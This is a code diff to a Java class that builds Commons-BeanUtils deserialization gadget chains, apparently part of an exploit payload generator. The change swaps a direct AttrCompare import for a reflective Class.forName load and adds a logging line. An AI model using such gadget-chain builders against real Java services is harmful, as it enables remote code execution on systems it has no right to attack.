@@ -1,10 +1,10 @@
 package com.ppp.chain.commonsbeanutils;
 
+import com.ppp.Printer;
 import com.ppp.utils.RanDomUtils;
 import com.ppp.utils.Reflections;
 import com.sun.org.apache.xerces.internal.dom.AttrNSImpl;
 import com.sun.org.apache.xerces.internal.dom.CoreDocumentImpl;
-import com.sun.org.apache.xml.internal.security.c14n.helper.AttrCompare;
 import javassist.ClassClassPath;
 import javassist.ClassPool;
 import javassist.CtClass;
@@ -39,7 +39,8 @@ public class BeanComparatorBuilder {
                 return queueGadgetMaker(comparatorScheduler(comparator1, version), templates, DEFAULT_QUEUE_PARAM);
             case AttrCompare:
                 AttrNSImpl attrNS = new AttrNSImpl(new CoreDocumentImpl(), "1", "1", "1");
-                BeanComparator comparator2 = new BeanComparator(null, new AttrCompare());
+//                BeanComparator comparator2 = new BeanComparator(null, new AttrCompare());
+                BeanComparator comparator2 = new BeanComparator(null, (Comparator<?>) Class.forName("com.sun.org.apache.xml.internal.security.c14n.helper.AttrCompare").newInstance());
                 return queueGadgetMaker(comparatorScheduler(comparator2, version), templates, attrNS);
             case ObjectToStringComparator:
                 BeanComparator comparator3 = new BeanComparator(null, new ObjectToStringComparator());
@@ -82,6 +83,7 @@ public class BeanComparatorBuilder {
             Reflections.setFieldValue(result, "comparator", comparator);
             return result;
         } else {
+            Printer.log("Use default cb version");
             return comparator;
         }
     }
